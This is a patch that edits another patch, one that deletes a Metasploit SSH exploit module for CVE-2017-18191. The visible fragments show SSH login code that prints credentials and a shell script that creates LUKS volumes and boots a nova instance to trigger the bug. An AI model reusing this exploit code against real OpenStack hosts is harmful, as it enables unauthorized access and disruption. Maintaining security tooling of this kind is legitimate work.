@@ -1,6 +1,6 @@
---- cve_2017_18191.rb	2019-05-08 04:45:22.358392876 -0400
+--- cve_2017_18191.rb	2019-05-08 10:05:20.777460467 -0400
 +++ /usr/share/metasploit-framework/modules/exploits/linux/ssh/cve_2017_18191.rb	1969-12-31 19:00:00.000000000 -0500
-@@ -1,268 +0,0 @@
+@@ -1,260 +0,0 @@
 -require 'net/ssh'
 -require 'net/ssh/command_stream'
 -
@@ -149,7 +149,7 @@
 -{
 -create_volume _LUKS_TEST_
 -create_volume _LUKS_NEW_TEST_
--nova boot --image $3 --flavor 1 _swap_test_
+-nova boot --image $test_image --flavor 1 _swap_test_
 -} > /dev/null
 -echo "create instance..."
 -sleep 10
@@ -207,14 +207,6 @@
 -} > /dev/null
 -
 -exit $result
--
--if [ $result -eq 0 ]; then
--  exit 1
--elif [ $result -eq 1 ]; then
--  exit 0
--else
--  exit -1
--fi
 -^
 -
 -  end 
@@ -226,7 +218,7 @@
 -    print_status("#{rhost}:#{rport} - Attempt to login...")
 -    ssh = do_login(user, pass)
 -    if ssh
--      print_good("#{rhost}:#{rport} - Login Successful ('#{user}:#{pass})")
+-      print_good("#{rhost}:#{rport} - Login Successful (#{user}:#{pass})")
 -      print_status("#{rhost}:#{rport} - run test shell script")
 -      exit_code = nil
 -      channel = ssh.open_channel do |ch|
